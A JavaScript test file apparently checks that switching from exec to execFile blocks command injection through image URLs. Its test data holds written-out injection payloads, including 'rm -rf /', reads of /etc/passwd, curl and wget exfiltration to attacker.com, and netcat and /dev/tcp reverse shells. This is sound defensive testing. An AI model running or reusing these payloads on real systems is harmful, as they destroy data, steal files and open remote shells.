const tap = require('tap');
const childProcess = require('child_process');

/**
 * Command Injection Prevention Tests
 *
 * These tests verify that the remediation for the command injection vulnerability
 * in routes/index.js line 161 is effective. The fix replaced exec() with execFile()
 * to prevent shell command injection attacks.
 */

tap.test('Command Injection Prevention - execFile Security', (t) => {

  t.test('execFile should treat malicious input as literal arguments', (t) => {
    // GIVEN: A malicious payload that would execute commands if using exec()
    const maliciousURL = 'http://example.com/image.jpg; rm -rf /';
    let commandExecuted = null;
    let argsReceived = null;

    // Mock execFile to capture what would be executed
    const originalExecFile = childProcess.execFile;
    childProcess.execFile = function(command, args, callback) {
      commandExecuted = command;
      argsReceived = args;
      // Simulate command completion
      if (callback) {
        callback(new Error('Command not found'), '', 'error');
      }
    };

    // WHEN: execFile is called with malicious input (as the fix does)
    childProcess.execFile('identify', [maliciousURL], (err, stdout, stderr) => {});

    // THEN: The command should be 'identify' and malicious code treated as single argument
    t.equal(commandExecuted, 'identify', 'Command should be identify');
    t.ok(Array.isArray(argsReceived), 'Arguments should be an array');
    t.equal(argsReceived.length, 1, 'Should have exactly one argument');
    t.equal(argsReceived[0], maliciousURL, 'Entire malicious string treated as single URL argument');

    // Restore original
    childProcess.execFile = originalExecFile;
    t.end();
  });

  t.test('execFile should not interpret shell metacharacters', (t) => {
    // Test various shell metacharacters that should NOT be interpreted
    const maliciousPayloads = [
      { payload: 'url.jpg; whoami', desc: 'semicolon command separator' },
      { payload: 'url.jpg && cat /etc/passwd', desc: 'AND operator' },
      { payload: 'url.jpg || malicious', desc: 'OR operator' },
      { payload: 'url.jpg | cat file', desc: 'pipe operator' },
      { payload: 'url.jpg & background', desc: 'background process' },
      { payload: 'url.jpg `whoami`', desc: 'backtick command substitution' },
      { payload: 'url.jpg $(whoami)', desc: 'dollar command substitution' },
      { payload: 'url.jpg > /tmp/file', desc: 'output redirection' },
      { payload: 'url.jpg < /etc/passwd', desc: 'input redirection' }
    ];

    maliciousPayloads.forEach(({ payload, desc }) => {
      let argsReceived = null;

      const originalExecFile = childProcess.execFile;
      childProcess.execFile = function(command, args, callback) {
        argsReceived = args;
        if (callback) callback(null, '', '');
      };

      childProcess.execFile('identify', [payload], () => {});

      // The payload should be passed as-is, not interpreted
      t.equal(argsReceived[0], payload, `Should not interpret ${desc}: ${payload}`);

      childProcess.execFile = originalExecFile;
    });

    t.end();
  });

  t.test('execFile vs exec behavior comparison', (t) => {
    // This test demonstrates why execFile is secure and exec is not

    // Unsafe pattern (what we fixed): exec with string concatenation
    const unsafePattern = (url) => {
      // This is VULNERABLE - DO NOT USE
      return `identify ${url}`; // Shell will interpret metacharacters in url
    };

    // Safe pattern (our fix): execFile with array arguments
    const safePattern = (url) => {
      // This is SAFE - arguments are not interpreted by shell
      return { command: 'identify', args: [url] };
    };

    const maliciousURL = 'http://evil.com/image.jpg; malicious-command';

    // Demonstrate the difference
    const unsafeCommand = unsafePattern(maliciousURL);
    const safeCommand = safePattern(maliciousURL);

    // Unsafe: produces a string that shell will parse and execute both commands
    t.equal(unsafeCommand, 'identify http://evil.com/image.jpg; malicious-command',
      'Unsafe pattern creates executable command string');

    // Safe: produces structured data where URL is isolated from command
    t.equal(safeCommand.command, 'identify', 'Safe pattern isolates command');
    t.equal(safeCommand.args[0], maliciousURL, 'Safe pattern treats malicious input as data');
    t.equal(safeCommand.args.length, 1, 'Safe pattern has single argument');

    t.end();
  });

  t.test('verify execFile does not spawn a shell', (t) => {
    // execFile directly executes the command without spawning a shell
    // This is the key security difference from exec()

    let capturedOptions = null;
    const originalExecFile = childProcess.execFile;

    // Override to capture execution details
    childProcess.execFile = function(command, args, options, callback) {
      if (typeof options === 'function') {
        callback = options;
        options = {};
      }
      capturedOptions = options || {};
      if (callback) callback(null, '', '');
    };

    childProcess.execFile('identify', ['test.jpg'], (err) => {});

    // execFile does not use shell by default (unlike exec which always does)
    t.notOk(capturedOptions.shell, 'execFile should not use shell by default');

    childProcess.execFile = originalExecFile;
    t.end();
  });

  t.test('legitimate URLs should work correctly with execFile', (t) => {
    // GIVEN: Various legitimate URL formats
    const legitimateURLs = [
      'http://example.com/image.jpg',
      'https://cdn.example.com/images/photo.png',
      'http://example.com/path/to/image.gif',
      'https://example.com/image-with-dash.jpg',
      'http://example.com/image_with_underscore.jpg',
      'https://example.com/image%20with%20space.jpg' // URL encoded space
    ];

    legitimateURLs.forEach(url => {
      let argsReceived = null;

      const originalExecFile = childProcess.execFile;
      childProcess.execFile = function(command, args, callback) {
        argsReceived = args;
        if (callback) callback(null, 'Image: 800x600', '');
      };

      // WHEN: Processing legitimate URL with execFile
      childProcess.execFile('identify', [url], () => {});

      // THEN: URL should be passed correctly and unmodified
      t.equal(argsReceived[0], url, `Legitimate URL preserved: ${url}`);

      childProcess.execFile = originalExecFile;
    });

    t.end();
  });

  t.test('special characters in URLs should not cause injection', (t) => {
    // URLs can contain characters that have special meaning in shells
    const urlsWithSpecialChars = [
      'http://example.com/file?param=value&other=123',
      'http://example.com/path#fragment',
      'http://example.com/file$name.jpg',
      'http://example.com/file%20name.jpg',
      'http://example.com/file(1).jpg',
      'http://example.com/file[1].jpg',
      'http://example.com/file{1}.jpg',
      'http://example.com/file*.jpg'
    ];

    urlsWithSpecialChars.forEach(url => {
      let argsReceived = null;

      const originalExecFile = childProcess.execFile;
      childProcess.execFile = function(command, args, callback) {
        argsReceived = args;
        if (callback) callback(null, '', '');
      };

      childProcess.execFile('identify', [url], () => {});

      // Special characters should be treated literally, not interpreted
      t.equal(argsReceived[0], url, `Special chars treated literally in: ${url}`);

      childProcess.execFile = originalExecFile;
    });

    t.end();
  });

  t.test('command injection attack vectors should be neutralized', (t) => {
    // Common attack patterns that work with exec() but not execFile()
    const attackVectors = [
      {
        name: 'command chaining with semicolon',
        payload: 'image.jpg; curl http://attacker.com/steal?data=`cat /etc/passwd`'
      },
      {
        name: 'command chaining with newline',
        payload: 'image.jpg\ncurl http://attacker.com'
      },
      {
        name: 'subshell execution',
        payload: 'image.jpg;$(nc attacker.com 1234 -e /bin/sh)'
      },
      {
        name: 'data exfiltration',
        payload: 'image.jpg;wget --post-file=/etc/passwd attacker.com'
      },
      {
        name: 'reverse shell attempt',
        payload: 'image.jpg;bash -i >& /dev/tcp/attacker.com/8080 0>&1'
      }
    ];

    attackVectors.forEach(({ name, payload }) => {
      let argsReceived = null;

      const originalExecFile = childProcess.execFile;
      childProcess.execFile = function(command, args, callback) {
        argsReceived = args;
        if (callback) callback(new Error('Invalid file'), '', 'error');
      };

      // Execute with the fix (execFile with array args)
      childProcess.execFile('identify', [payload], () => {});

      // The entire attack payload is treated as a single filename argument
      // It will fail to find the file, but won't execute any injected commands
      t.equal(argsReceived.length, 1, `${name}: single argument`);
      t.equal(argsReceived[0], payload, `${name}: attack code not executed`);

      childProcess.execFile = originalExecFile;
    });

    t.end();
  });

  t.test('verify the regex extraction does not alter the URL', (t) => {
    // The vulnerability flow: req.body.content -> regex match -> exec
    // This test verifies the regex extraction itself doesn't introduce issues

    const imgRegex = /\!\[alt text\]\((http.*)\s\".*/;
    const testCases = [
      {
        input: '![alt text](http://example.com/image.jpg "title")',
        expected: 'http://example.com/image.jpg'
      },
      {
        input: '![alt text](http://evil.com/img.jpg; whoami "title")',
        expected: 'http://evil.com/img.jpg; whoami'
      }
    ];

    testCases.forEach(({ input, expected }) => {
      const match = input.match(imgRegex);
      if (match) {
        const extractedURL = match[1];
        t.equal(extractedURL, expected, `Regex extraction: ${input}`);

        // Verify extracted URL is then safely passed to execFile
        let argsReceived = null;
        const originalExecFile = childProcess.execFile;
        childProcess.execFile = function(command, args, callback) {
          argsReceived = args;
          if (callback) callback(null, '', '');
        };

        childProcess.execFile('identify', [extractedURL], () => {});
        t.equal(argsReceived[0], extractedURL, 'Extracted URL passed safely to execFile');

        childProcess.execFile = originalExecFile;
      }
    });

    t.end();
  });

  t.end();
});
